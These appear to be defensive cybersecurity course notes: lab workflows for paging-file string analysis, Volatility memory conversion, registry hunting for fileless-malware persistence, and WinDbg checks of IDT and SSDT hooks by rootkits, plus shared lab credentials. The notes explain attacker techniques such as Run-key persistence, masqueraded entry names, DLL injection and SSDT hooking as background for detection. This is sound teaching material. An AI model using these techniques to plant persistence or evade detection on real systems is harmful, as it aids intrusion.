![image](https://github.com/user-attachments/assets/fc747bd5-2ae0-47ea-8fac-f4ae96481409)
![image](https://github.com/user-attachments/assets/395dc8a7-c50c-4280-9c9c-82e5aaf84da0)


--------------

### CDAH-M18L3-Paging and Virtual Memory Analysis ###

Paging File Analysis
A paging file (or page file) is a hidden system file used in the Windows Operating System (OS) that serves as a physical extension of Random Access Memory (RAM). In terms of computer memory, a page is a fixed-length block of memory. When RAM is heavily used, the OS may transfer pages between RAM and a hard drive. This operation is known as paging, and Windows transfers pages from RAM to a paging file called pagefile.sys.

﻿

﻿

Figure 18.3-1﻿

﻿

Paging File Contents
﻿

Memory paging allows the OS to implement virtual memory, which is a memory management technique that provides additional storage to support RAM use, especially in systems with a limited amount of RAM. Portions of data in main memory are paged into pagefile.sys, where they remain until they are called for and subsequently returned to RAM. As a result, potential exists to recover forensic artifacts from the paging file that may not be present in main memory at the time of a forensic memory acquisition. Similar files, such as swapfile.sys and hiberfil.sys, can also be used to gather forensic artifacts without directly making a forensic memory acquisition. In Windows, swapfile.sys is used for memory swapping (similar to paging, but with a much smaller data footprint and meant for quick data transfers for idle programs), whereas hiberfil.sys stores components of RAM as well as the Windows kernel and device drivers necessary to support Windows hibernation.

﻿

Unfortunately, the paging file is meant to be convenient for the OS, not a forensic examiner, and the data stored in the paging file is not always stored consecutively. As a result, analysis of a paging file consists mainly of searching for strings, which can be performed via the Linux command line and is explored in the following lab.

﻿

Analyze a Windows Paging File
﻿

Complete the steps in the following workflow to inspect a paging file using the strings command.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) sift using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Terminal.

﻿

3. Run the following command to navigate to the evidence folder:

cd evidence/
﻿

A file named pagefile.sys is located in the evidence folder.

﻿

4. Run the following command to search for Uniform Resource Locators (URL) stored within pagefile.sys and save the sorted and de-duplicated results to an output text file named urls.txt:


strings pagefile.sys | egrep "^https?://" | sort | uniq > urls.txt
﻿

NOTE: The above command may require a few minutes to execute due to the size of the paging file.

﻿

5. Run the following command to manually inspect the URL search output file:


less urls.txt
﻿

The list of URLs can be perused by entering the space key. The results are lengthy, and manual analysis may require more time than this exercise allows.

﻿

6.  Enter q to return to the command prompt for further analysis.

﻿

7. Run the following command to obtain the number of URLs recorded in the urls.txt file:


wc -l urls.txt
﻿

The above command counts the number of lines in the urls.txt file, which is sufficient because each line in the file contains a single, unique URL.

﻿

Given the number of URLs returned, it would be more efficient to search within these results for specific items of interest than to analyze each individual URL. For example, the user of the system from which this paging file was extracted likely performed several internet searches. 

﻿

8. Run the following command to filter the URLs to those containing a search query:


grep "search_query" urls.txt
﻿

The result of the above command shows 10 URLs containing the substring search_query. These are all from the same domain and shed some light on the user’s activities. During an investigation, understanding the behaviors of a user on a system can be beneficial for identifying any habits that may have led to a compromise. Additionally, anomalous behavior might be discovered that alerts an investigator that an account may have been compromised, such as web browsing to a site offering a remote network connection tool. In addition to hard disk and memory acquisition forensic analysis, the paging file can offer information to support an investigation.

﻿

Use the above workflow to answer the following question.

![image](https://github.com/user-attachments/assets/e7b87fbd-52ce-48b4-abb3-5669944bd87f)
![image](https://github.com/user-attachments/assets/93804185-256e-42ef-ac15-93c38a937c9b)


--------------------


Virtual Memory Analysis
Forensic memory acquisitions can be taken from a physical system, such as a workstation or server, using such tools as FTK® Imager. The same methods can be used to capture virtual memory acquisitions within a Virtual Machine (VM), or the virtual memory (.vmem) file can be extracted from the VM folder located on the host machine.

﻿

Depending on the VM software used (for example, VMware or VirtualBox), the virtual memory file is loaded into Volatility in its existing format for analysis, or it may require conversion to make it ready for analysis. Within the Volatility framework, the tool raw2dmp can be used for this purpose, as seen in the following lab.

﻿

Convert a Virtual Memory File
﻿

Complete the steps in the following workflow to convert a virtual memory file for analysis with Volatility.

﻿

Workflow
﻿

1. Log in to the VM sift using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Terminal.

﻿

3. Run the following command to navigate to the evidence folder:

cd evidence/
﻿

4. Run the following command to convert the virtual memory file into a dump ready for analysis:


vol.py -f dump.vmem -O mem.dmp -–profile=Win7SP1x64 raw2dmp
﻿

This process occurs with the assumption that the virtual memory file came from a VM running the 64-bit Windows 7 Operating System (OS) with Service Pack 1 installed. This information may be available at the time the virtual memory file was acquired, through inspection of either the VM software or supporting virtualization files associated with the VM. The resulting dump file can then be analyzed using Volatility or Redline.

![image](https://github.com/user-attachments/assets/cbb37da4-7bf0-40ce-a410-03d39811e1a2)

--------------

Analyze a Virtual Memory Acquisition
In the following lab, armed with a converted virtual memory file and a supporting paging file from the same system under investigation, capture information vital for analysis of a reported system compromise.

﻿

Consider the following scenario: A report of a system compromise has led to the acquisition of a virtual memory file and paging file from a VM used by Bob Bobson. The report details that Bob was using the VM for casual web browsing when strange terminal windows suddenly appeared on his screen. He called for help, and FTK Imager was installed to extract the paging file. The virtual memory file was also acquired.

﻿

The virtual memory file has since been converted to a dump ready for analysis via Volatility and Redline.

﻿

Complete the steps in the following workflow to analyze the virtual memory of the compromised system using Volatility.

﻿

Workflow
﻿

1. Log in to the VM sift using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Terminal.

﻿

3. Run the following command to navigate to the evidence folder:

cd evidence/
﻿

4. Analyze the virtual memory acquisition file mem.dmp and the paging file pagefile.sys to uncover forensic artifacts using the skills learned using Volatility and string analysis.

﻿

Complete the steps in the following workflow to analyze the virtual memory of the compromised system using Redline.

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open Redline.

﻿

3. Analyze the virtual memory file that has already been loaded as AnalysisSession1. 

﻿

NOTE: Both Volatility and Redline are available to analyze the virtual memory. However, the paging file is available for string analysis only on sift.

﻿

Focus on looking for suspicious processes, network communications, and registry changes. 

﻿

Use the information obtained to answer the following questions, which ask for specific information about key forensic artifacts related to this investigation.

 strings pagefile.sys | egrep -i "^computername"

![image](https://github.com/user-attachments/assets/ee56c1a4-de98-4582-a59a-778bd8fbcca2)

---------------

### CDAH-M19L1-Identifying Fileless Malware in Memory ###


Fileless Malware Overview
Fileless Malware Techniques 
﻿

Fileless malware techniques fall into two major categories: Living off the Land (LotL) and in-memory malware. Each category exposes different characteristics and features to exploit the host, and the techniques in each typically begin with a spear-phishing campaign to compromise hosts and allow the adversary to gain a foothold. 

﻿

Living off the Land
﻿

LotL leverages utilities readily available within an organization’s digital environment to move through attack phases without employing explicitly malicious files or binaries. Adversaries commonly operate with administrative tools or Operating System (OS) features already on the host. Any tool that enables code or script execution is vulnerable to an adversary employing LotL. One such tool frequently used is PowerShell. Native to the Windows OS, PowerShell provides the capability to execute scripts and cmdlets, allowing the adversary to enumerate, move laterally, and persist. The adversary can leverage PowerShell to access a script from a location on the internet and execute it on the host. 

﻿

In-Memory 
﻿

In-memory malware leverages applications already running on the host by injecting malicious code into them. The in-memory technique avoids detection by executing within applications that have been approved by the organization and are not scanned by antivirus software. When a foothold is established on the host, stagers, cradles, or droppers can be accessed via the internet and executed within process memory. In-memory techniques include process hollowing and reflective Dynamic Link Library (DLL) injection. Process hollowing involves creating a benign, or expected, process and loading it in a suspended state. The suspended state allows the adversary to use the suspended process as a container for malicious code. Reflective DLL injection involves loading a DLL from memory, which causes the library to load itself rather than rely on the host system. With reflective DLL injection, the adversary can inject code that evades the host system’s oversight. 


-----------------


Fileless Malware Subtechniques
Fileless malware includes subtechniques that enable the use of LotL or in-memory execution. Examples of such subtechniques include the following.

﻿

Exploit Kits
﻿

Exploit kits are collections of code, commands, or data used to exploit hosts. The adversary can employ exploit kits to target specific vulnerabilities once a foothold has been established within the host. Exploit kits can be injected into memory and executed via applications already running, so the content of the exploit kit is not saved on the host. 

﻿

Registry Malware
﻿

Registry malware is injected into the Windows registry with the goal to maintain persistence. Injecting into the registry allows for the malware to be executed when the OS is loaded. 

﻿

Fileless Ransomware
﻿

The adversary may use a fileless campaign to execute ransomware. The ransomware leverages native tools to encrypt high-target files on the host. Once the files are encrypted, the adversary demands a ransom to be paid to unlock the files. Using a fileless campaign, no code is written to the disk. 

﻿

Stolen Credentials 
﻿

Adversaries may leverage stolen credentials to access hosts and use native tools for their operations. Stolen credentials allow the adversary to act as a legitimate user who is expected to access and use the host. 


------------

Fileless Malware Attack Flow
Fileless malware attack flow is unique to each attack, but it is commonly a simplified version of the MITRE ATT&CK® framework. The common steps of a fileless malware attack are as follows:

﻿

1. Gain Access (MITRE Identifier [ID]: TA0001): The first step of the attack begins when the adversary gains access to the host or network, commonly through a spear-phishing campaign. 

﻿

2. Steal Credentials (MITRE ID: TA0006): The adversary works to steal and validate credentials. The stolen credentials allow the adversary to operate as a legitimate user and move throughout the exploited targets. 

﻿

3. Maintain Persistence (MITRE ID: TA0003): The adversary creates an environment to maintain access to the host without requiring a return to the first step of the flow (gaining access). Maintaining persistence is commonly achieved through the use of the Windows registry. 

﻿

4. Exfiltrate Data (MITRE ID: TA0010): The adversary exfiltrates data from the victim host and moves it to the adversary’s environment, avoiding detection. Once the data is obtained, the attack flow is completed. 


![image](https://github.com/user-attachments/assets/4d20e4cd-8718-4590-b73d-75903fbd3696)


--------------


Notable Fileless Malware Attacks
Fileless malware attacks have existed for at least two decades, and the number of attacks is increasing dramatically, using different exploits and vulnerabilities. Notable fileless malware attacks include the following.

﻿

SQL Slammer  
﻿

First appearing in South Korea in 2003, the SQL Slammer is a worm that exploited a Microsoft Structured Query Language (SQL) vulnerability and infected hosts connected to the internet. The worm infected approximately 250,000 hosts globally by attempting to connect to every host over port 1434. 

﻿

Stuxnet  
﻿

Discovered in 2010 but believed to have originated in 2005, Stuxnet is a worm likely developed by the United States that targeted Programmable Logic Controllers (PLC) of Iran’s nuclear facilities, crippling hardware and seizing nuclear enrichment. 

﻿

Equifax 
﻿

In 2017, a Chinese adversary conducted a data breach of the Equifax® credit bureau, stealing personal information of approximately 147 million people. The adversary leveraged a vulnerability in Apache Struts, a web application framework, where malicious commands in-memory were executed.  




![image](https://github.com/user-attachments/assets/45c4dd2c-30eb-444b-8cf3-51c4ce362765)
![image](https://github.com/user-attachments/assets/ec6641a8-8127-45fe-901d-684dafec1f2c)


--------------

Fileless Malware Detection
At its core, fileless malware avoids detection by hiding in applications, processes, and memory that have been approved by the organization to operate within the network. Detection of fileless malware includes searching, reviewing, and analyzing areas of the host where processes live to assess if outliers or anomalies exist, such as inside unexpected files or scripts. Due to the number of processes running on a host, detection for fileless malware can often be tedious and require significant time. Reviewing threat intelligence and Indicators of Compromise (IOC) from previous campaigns aids in analysis of registries and processes.

﻿

Windows Registry
﻿

The Windows registry is a collection of all operations and configurations that occur on the host. Because the registry acts as a central location of all operations, it is a logical target for an adversary to insert fileless malware using scripts or injections. 

﻿

Process Analysis
﻿

Because fileless malware operates within processes running on the host, the processes should be analyzed. Detection by process analysis requires using tools such as Autoruns, Process Explorer, and Process Monitor, all part of Windows Sysinternals. Such tools enable analysts to determine if any unexpected files or anomalies exist.


-----------------

Detection within Windows Registry
The Windows registry is the centralized location of all operations and configurations within the Windows OS. In the following lab, access the registry to discover locations where an adversary may attempt to hide fileless malware.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) win-hunt using the following credentials:


Username: trainee
Password: CyberTraining1! 
﻿

2. Select Cancel when prompted with The publisher could not be verified. Are you sure you want to run this software? 

﻿

NOTE: This anomaly is explained in the next workflow  

﻿

3. Right-click the Windows icon, and select Run.

﻿

4. In the Run input box, enter regedit.

﻿

Regedit opens Registry Editor, which enables modification of the registry.

﻿

5. Select Yes when prompted with Do you want to allow this app to make changes to your device?  

﻿

6. Navigate to the path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion﻿

in Registry Editor.

﻿

7. In the left pane, scroll to and select the Run folder. 

﻿

Depending on the host, the registry may contain one or multiple Run folders. The Run folder contains the list of programs configured to run automatically when the host powers on. When attempting to detect fileless malware, examine the Run folders for any programs or files that contain misspelled words. Adversaries commonly name files and programs with names that are expected but with slight spelling errors to avoid detection. 

﻿

8. Notice within the Run folder the string entry Window_Defender.

﻿

The Window_Defender entry is designed to resemble the WindowsDefender entry, which is the entry to start the antivirus software upon boot of the host. Window_Defender instead points to the path C:\Windows\System32\WindowsPowerShell\v1.0, which is the path for Windows PowerShell, a known target for a fileless malware attack. An entry such as Window_Defender reflects how adversaries attempt to avoid detection and execute a fileless malware attack. 

﻿

Adversaries’ techniques are constantly evolving to avoid detection and execute campaigns. The Run folder is not the only location where adversaries have been known to execute fileless malware attacks. Adversaries may also attempt to run fileless malware using the registry paths that follow:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders

HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\explorer\User Shell Folders

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\explorer\Shell Folders

Remain logged in to the win-hunt VM for the next workflow.

![image](https://github.com/user-attachments/assets/1b929c97-dc76-4b87-baac-0d4bb6d39241)


---------------------


Discover Fileless Malware
In the following lab, consider the provided scenario, and use skills and information about fileless malware to investigate the host machine for its occurrence. 

﻿

Scenario 
﻿

A Cyber Protection Team (CPT) has been tasked with investigating activity across a wide range of hosts.  Hosts on the network have been experiencing strange activity. Numerous users have reported that the activity occurred after selecting a link in an email message from an account posing as the organization’s lead. The CPT is responsible for investigating the ls-wkstn-3 host, with a goal of determining if the host is compromised by fileless malware. 

﻿

Other hosts on the network have experienced registry manipulation, to include Windows PowerShell, WMI, and Wscript (an environment where users can execute scripts in a variety of languages to perform tasks), on the following paths:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders

Workflow
﻿

1. Log in to the VM ls-wkstn-3 using the following credentials:


Username: trainee
Password: CyberTraining1! 
﻿

2. Review each of the registry paths where other hosts have experienced manipulation.

﻿

Use this workflow to answer the following questions.

![image](https://github.com/user-attachments/assets/a3443ad1-c6b2-42e5-81a5-62fa854c2e6e)

![image](https://github.com/user-attachments/assets/5094eeb4-df58-409e-aae6-de8d2565a497)
![image](https://github.com/user-attachments/assets/6590ffa0-c8ec-4383-bba5-172ab4fb5fd5)


-------------

Investigate Suspicious Registry Entry
Figure 19.1-5 shows a suspicious entry within the host’s registry. The entry Local ApData calls to the path of Windows PowerShell sessions. Calling the Windows PowerShell session is probably an attempt by the adversary to automatically run a script located on the host whenever the host boots up. Labeling the entry as Local ApData is an attempt to mirror the legitimate entry Local AppData, likely to avoid detection. 

![image](https://github.com/user-attachments/assets/57d9cf63-e893-4363-8aa3-d9f7b33c52f2)
﻿
It is unknown whether the addition of Windows PowerShell at this location of the registry will allow the adversary to automate the execution of a script. It is most common to place processes and configurations that execute upon boot in either the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run or HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce registry path. The next portion of the investigation must focus on the PowerShell terminal history. 


Use the Ctrl+R keyboard shortcut to search and review the Windows PowerShell terminal history, both as user trainee and as Administrator, to discover any suspicious script execution. Using the results, answer the following question.

![image](https://github.com/user-attachments/assets/c1415570-1885-4957-a5b7-c8df51b53130)
![image](https://github.com/user-attachments/assets/97089daa-a054-423b-8de2-9de126ae929d)



------------------

Suspicious PowerShell Script
The following execution shows the use of a suspicious script:

PS C:\Windows\system32> .\Write-Host.ps1
﻿

The script was executed while running Windows PowerShell with Administrator privileges. Administrator privileges indicate that the adversary successfully elevated privileges on the host and is capable of making changes and configurations unavailable to the average user. 

﻿

Based on intelligence gathered from other CPTs, this script is likely a variant of the scripts found on other hosts throughout the organization. On the other hosts, scripts have been found, all with different names, that perform tasks to maintain persistence on the host. 

﻿

Review the path HKEY_LOCAL_MACHINE\SOFTWARE\PayloadKey within the registry.

﻿

The path within the registry includes the entry for a persistent registry key. It is likely that the script executed by the adversary using Windows PowerShell generated the registry key, containing payload from the host, and aimed at maintaining a foothold on the host. The registry key is Base64 ciphered and requires further analysis to discover what it contains. 

﻿

The investigative steps taken have identified host ls-wkstn-3 as compromised by the adversary. The adversary gained initial access and elevated credentials to leverage Windows PowerShell, a tool native to the host. Using Windows PowerShell, the adversary then executed a script aimed at maintaining persistence and collecting a payload.


---------------------------

### CDAH-M19L2-Identifying Kernel Level Rootkits in Memory ###


Rootkit Overview
A rootkit is a type of malware that enables an attacker to gain access to, and exploit data from, a host without being detected. Rootkits are among the most difficult types of malware to destroy because of their ability to remain hidden. They are often designed to give an attacker remote control of a system or eavesdrop on victims. Rootkits may contain multiple malicious tools, and they are often more advanced than a typical computer virus.

﻿

Many times, rootkits spread through such means as corrupt downloads, spam or phishing emails, and exploit kits. Some rootkits can be delivered through other malware to hide the true goal behind an attack. 

﻿

Unlike other types of malware, rootkits rarely display many symptoms after infecting a machine, and some can even bypass security software. At times, rootkits can be removed only by formatting the storage on a machine and reinstalling the Operating System (OS).

﻿

The kernel is the portion of the OS that manages all the computer’s essential functions, and kernel-level rootkits operate at this kernel level of the OS. A computer must already be compromised for kernel rootkits to be installed. 

﻿

A kernel-level rootkit has the same privileges as the OS, and the rootkit gives the attacker control of the system. An attacker can use this rootkit to control the machine in any way that meets the attacker’s goal. A kernel-level rootkit can make it possible to add, delete, or replace any code on the machine. 

﻿

A kernel rootkit can be loaded onto a system as a malicious driver or a kernel extension, often through call-hooking. Call-hooking involves redirecting the normal execution of code with code that is replaced by an attacker, which can happen in a system library or via OS system calls (syscalls). An attacker can modify the original code so that it still performs the intended operation but also includes a malicious task. For example, OS code infected with a rootkit may return the contents of a directory as the code originally intended, but the rootkit prevents the attacker’s malicious files from appearing in those contents as well, avoiding detection by the OS. 

![image](https://github.com/user-attachments/assets/3168eb2a-6f90-4e36-99d0-10df1892af32)

-----------------

**Identification of Kernel-Level Rootkits in Memory
Although detecting a kernel-level rootkit can be difficult, multiple detection methods and tools are available, such as the Windows Debugging Tool (WinDbg). Developed by Microsoft, WinDbg is useful for performing analysis on a Windows machine, with scripts allowing various actions to be performed. Host analysts primarily use WinDbg to troubleshoot and analyze issues within memory of systems, applications, and executables. WinDbg is explained and used throughout the remainder of the lesson to identify kernel-level rootkits in memory.﻿

----------------

Rootkit Detection Methods
The following describes various methods of rootkit detection.

﻿

Memory Dump 
﻿

One method of rootkit detection is the memory dump. By performing offline analysis of raw memory dump data, identification of a rootkit is possible. An analyst can use the same techniques applied to a memory dump on a live machine, but some restrictions exist. 

﻿

Memory dumps are of four types: raw memory dumps, Windows crash dumps, Windows hibernation (hiberfil.sys) files, and virtual memory (VMEM) dumps. 

﻿

Raw Memory Dump
﻿

A raw memory dump is the most common type of memory dump. Raw file formatted memory dumps do not contain headers, metadata, or magic values; they are snapshots of the OS memory.     

﻿

Windows Crash Dump
﻿

All Windows OSs are configured to collect information about the status of a computer in case the computer crashes. A Windows crash dump file typically begins with _DMP_HEADER or _DMP_HEADER64 structure. Three types of memory dumps are available in a Windows crash dump, as follows:

Complete memory dump: This memory dump is the largest kernel-level memory dump; it contains everything that was in the physical memory of the computer. 
Kernel memory dump: This memory dump contains everything that was used by the kernel at the time of the crash. Because this file contains only the data that was being used by the kernel, it is significantly smaller than a complete memory dump. The kernel memory dump does not include unallocated memory or any memory allocated to user-level applications.
Small memory dump: This memory dump is smaller than either the complete or kernel memory dump and contains the following:
The bug check message and parameters of the blue screen data.
The processor context for the processor that crashed.
The process information and kernel context for the process that crashed.
The thread information and kernel context for the thread that crashed.
A list of loaded drivers.
Windows Hibernation (hiberfil.sys) File
﻿

When a computer is put into hibernation mode, the computer powers down while retaining its current state. Upon hibernation, the computer saves the contents of the RAM to the storage disk so that when the computer is awakened, the computer is exactly as it was before entering hibernation. When the hibernation process occurs, a hibernated file is created in the system folder containing the content of the full dump of the memory. This file, hiberfil.sys, is equal in size to the computer’s RAM.

﻿

Virtual Memory (VMEM) File
﻿

When using VMware on a machine, a file is created named VMEM. This file contains the entire volatile memory of a Virtual Machine (VM), including the page file content.

﻿

Signature-Based Analysis
﻿

Another rootkit detection technique is signature-based analysis. This method uses characteristic signatures from known rootkits to determine if a rootkit is present on a system. Most security software tools use signatures extracted from a file or network packet to determine if a rootkit is present. In addition, behavioral patterns on certain activities that are typical of rootkits may be analyzed to see if a specific file or process is indeed a rootkit. 

﻿

Detection of Interceptions
﻿

Another rootkit detection technique is detection of interceptions. Windows uses pointer tables, such as System Service Descriptor Tables (SSDT) and Interrupt Descriptor Tables (IDT), to redirect system requests. Rootkits can attempt to replace or edit these tables to specify handlers for certain interrupts. This allows the rootkits to request that certain OS functions always be handed to the rootkit, which enables the rootkit to find and counter any detection efforts made by the victim.  

﻿

System Service Descriptor Table
﻿

The SSDT is a data array in kernel memory that stores pointers to the native Application Programming Interface (API) functions of Windows, such as Windows NT kernel services like NtCreateFile. The table contains information about the service tables used by the OS for dispatching system calls. These functions are handled in the system process Ntoskrnl.exe, which is the Windows NT OS kernel. The pointer to this structure is KeServiceDescriptorTable.

﻿

The SSDT contains such information as the address index table, the base address of the index table, and the number of service functions. If the function address of the table is modified, Windows functions can be hooked to conceal or monitor Windows system actions. 

﻿

There are two types of SSDTs, the KeServiceDescriptorTable and the KeServiceDescriptorTableShadow, and they correspond to two types of system services. The KeServiceDescriptorTable is exported by the system process Ntoskrnl.exe; the KeServiceDescriptorTableShadow is not. 

﻿

Using the call-hooking technique discussed earlier, attackers may attempt to modify the SSDT to allow syscalls to be redirected to routines outside the kernel. The routines can then hide the presence of a rootkit or act as a backdoor to execute code with kernel-level privileges. 

﻿

Interrupt Descriptor Table
﻿

User applications requesting the execution of a system-level function need a higher privilege level for execution to occur. This process is implemented using program interrupts. The IDT is a structure used when dispatching interrupts.

﻿

In Windows NT, system requests are initialized by executing the int 2e command. The int portion of the command tells the CPU to generate a program interrupt. It then refers to the IDT index of 2e and reads data from that address. The processor sets the execution pointer value to the offset of the interrupt service routine stored in the IDT. System calls use the dispatcher service KiSystemService. 

﻿

The command !idt 2e in WinDbg displays the routine pointer value, which is normally set to the address of the KiSystemService system call. If the routine pointer value is not set to the address of the KiSystemService call, the program interrupt may have been intercepted by an attacker, and further investigation is warranted.   

﻿

To alter the execution of a program, an attacker modifies either the system call addresses or the code of the system calls. The system calls may be modified in place or altered to readdress execution to a specific segment of code.

﻿

Debugging tools, such as WinDbg, make detection of such interceptions in pointer tables possible.

﻿

Data Comparison
﻿

Another rootkit detection technique is the comparison of data from different sources. Rootkits often alter data on a system returned to a user in order to mask their presence. It is possible to detect a rootkit by comparing the results returned with high-level and low-level system calls. A variation of this method is to compare the process memory on a computer’s RAM with the content of the file stored on the computer’s storage drive. This method helps to identify any hidden resources on a system.

﻿

Integrity Check
﻿

An integrity check can be performed to check for a rootkit. A digital cryptographic hash is created for every system library when a system is created. Libraries can be checked for code alteration by performing an integrity check on the system, which compares the original cryptographic hash with the current one.

﻿

Antivirus with Rootkit Scan
﻿

One of the most effective methods to detect a rootkit is by using an antivirus solution that has rootkit scan capabilities. Some rootkit scans combine all the above methods. An antivirus solution uses a memory dump to analyze the signature of known attacks with detected signatures on a system. It also uses behavior analysis to detect known rootkit patterns.  


------------------------

Rootkit Protection and Removal
No guaranteed method exists for recovering a machine after a rootkit has been detected. However, the following steps can be taken to protect the computer and remove any malware that is found:

﻿

1. Back up any vital data and files existing on the infected machine. It is possible that during removal, the rootkit will further damage the infected machine’s performance or even trigger another hidden rootkit on the system. Backing up essential files and data is essential.

﻿

2. Boot the system in safe mode. Rootkits may attempt to prevent a user from installing any security software or removing the malware, and booting the system in safe mode can limit a rootkit’s access to the machine.

﻿

3. Use multiple rootkit scan tools. Because each antivirus tool has different capabilities, multiple tools may be effective in fully removing a rootkit from the infected machine.

﻿

4. Scan for any remaining malware. Once the rootkit is discovered and removed, continue to scan for any other malware on the machine. Often, the rootkit was delivered through other malware on the system that is also attempting to evade malware scans. 

----------------------

Rootkit Detection Using WinDbg
WinDbg is Microsoft’s multi-function debugging tool for Microsoft Windows. It is used to debug applications, drivers, devices, or issues with the OS itself. WinDbg works exclusively with crash dumps; any other type of memory dump must be converted into a crash dump. The following illustrates ways WinDbg can help detect rootkits in Windows.

﻿

Detecting Changes in Interrupt Descriptor Tables
﻿

WinDbg can detect alterations to the code of system functions. The following WinDbg command checks the code integrity of system calls by comparing volatile memory content with code that is stored on the server:

!chkimg -d nt
﻿

Using the above command, WinDbg lists any differences between the current code on the system and the copies on the server, potentially detecting any interceptions. 

﻿

Searching for Hidden Rootkits in Memory
﻿

Some rootkits load their executable images directly into the system’s memory. These files are usually in the Windows Portable Executable (PE) format and can be identified with the MZ signature that appears in the beginning of the image. WinDbg can search for this signature through the OS memory. The command for this is as follows:

s -d 0x0 L?0xffffffff 0x00905a4d
﻿

After the above command runs, the debugger lists all entries that contain the MZ signature. Figure 19.2-1 provides an example list:

﻿

![image](https://github.com/user-attachments/assets/6890fef8-df1c-4a33-ab96-49449c31835f)

module. The other four columns represent the first four words in the module. If the module were properly loaded into the system memory, the command !lmi would list information pertaining to the module. However, if the module were placed directly into the memory by an attacker, the system would not have any information about the process. The !lmi command would then return the following output:

> !lmi 5ad7000
Loaded Module Info: [0x5ad7000]
fffff5ad7000 is not a valid address


----------------

View the IDT and SSDT
In the following lab, use WinDbg to view portions of memory containing the IDT and SSDT.

﻿

View the IDT
﻿

Complete the steps in the following workflow to view portions of memory containing the IDT.

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open WinDbg as an Administrator.

﻿![image](https://github.com/user-attachments/assets/d5da1b6f-4a86-4de2-baa4-69057e78feb5)

3. Go to File > Kernel Debug > Local, and select OK.


4. Run the following command to view the IDT routine pointer value:
!idt 2e



5. Run the following command to display the entire IDT contents:
!idt -a



6. Run the following command to check for any code alterations to system functions:
!chkimg -d nt  



The above commands can be used when investigating a rootkit in the IDT. The routine pointer value can be compared to the value of the KiSystemService to ensure that the service has not been intercepted. The chkimg command should be used to ensure that there have not been any unapproved code alterations to the system functions.


View the SSDT


Complete the steps in the following workflow to view portions of memory containing the SSDT.


Workflow


1. Once WinDbg is connected, run the following command to load the ntdll module:
.reload /f ntdll.dll



2. Run the following command to ensure the ntdll module is loaded:
lm ntdll



3. Run the following commands to view the KeServiceDescriptorTable:
dps nt!keservicedescriptortable L4



4. Run the following command to print out values from the SSDT:
dd /c1 KiServiceTable L2



5. Enter the following command to find the syscall for the NtCreateFile function in Windows:
   
u ntdll!ntcreatefile L2

![image](https://github.com/user-attachments/assets/e8f0acfa-837e-479e-9f42-a08efd8572b6)


The syscall for this function is 0x55.


6. Run the following command to find the offset of the NtCreateFile function:
dd /c1 kiservicetable+4*0x55 L1



Offsets are four bytes in size, so the command above uses the formula +4*0 (where the asterisk indicates multiplication) to find the offset for the syscall 0x55. The offset returned in the above command is 00febd07.


7. Run the following command to find the absolute routine address of the NtCreateFile kernel routine that is called with the 0x55 syscall: 
u kiservicetable + (00febd07>>>4) L1



The above command uses the syntax AbsoluteRoutineAddress = kiservicetable + (offset >>> 4).


8. It is also possible to list all the API names associated with their corresponding absolute addresses with the following command that uses a for loop. After running the command for 10 seconds, enter the Ctrl+Break keyboard combination to stop the command.
.foreach /ps 1 /pS 1 ( offset {dd /c 1 nt!KiServiceTable L poi(nt!KeServiceDescriptorTable+10)}){ r $t0 = ( offset >>> 4) + nt!KiServiceTable; .printf "%p - %y\n", $t0, $t0 } 



If an analyst were investigating the SSDT for a rootkit, the above commands could be used to ensure that the routine addresses were all correct and matched up with one another. A mismatch of routine addresses during an investigation of the SSDT could symbolize a potential rootkit and be worthy of further investigation.

![image](https://github.com/user-attachments/assets/d30e215e-2181-4f84-8cdd-31b335bc06ce)



---------------------

Identify Kernel-Level Rootkits in Memory
Consider the following scenario: A possible rootkit has been discovered on the win-hunt machine. The address 014b0101 is linked to the rootkit. In the following lab, use this address to find the name of a user function and the name of the table infected with the rootkit.

﻿

Workflow
﻿

1. Log in to the VM win-hunt using the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open WinDbg as an Administrator.

﻿

3. Go to File > Kernel Debug > Local, and select OK.

﻿

4. Run the following command to view the KeServiceDescriptorTable:

dps nt!KeServiceDescriptorTable L10
﻿

5. Because the address of the function is not in that table, run the following command to view the KiServiceTable:

dds KiServiceTable
﻿

The address 014b0101 is listed in the table.

﻿

6. Run the following command to display the name of the function that is associated with the infected address:

u KiServiceTable +(0x014b0101 >>> 4)
﻿

7. Run the following command to verify that the function NtQueryInformationProcess matches with the output received from the address 014b0101:

u nt!NtQueryInformationProcess L8
﻿
![image](https://github.com/user-attachments/assets/7c8bbc76-3d0a-4aeb-b014-c7f00f48f37e)


----------------------------

### CDAH-M20L1-Log Clearing ###

Log-Clearing Methods
Log Clearing
﻿

Adversaries mask their presence in an environment by editing or removing system and application logs. Without accurate log data, organizational security teams cannot rely on their security tools to identify adversarial actions. For example, an adversary might exploit a Windows update vulnerability and manipulate the system logs to appear as though there were a standard update in progress.

﻿

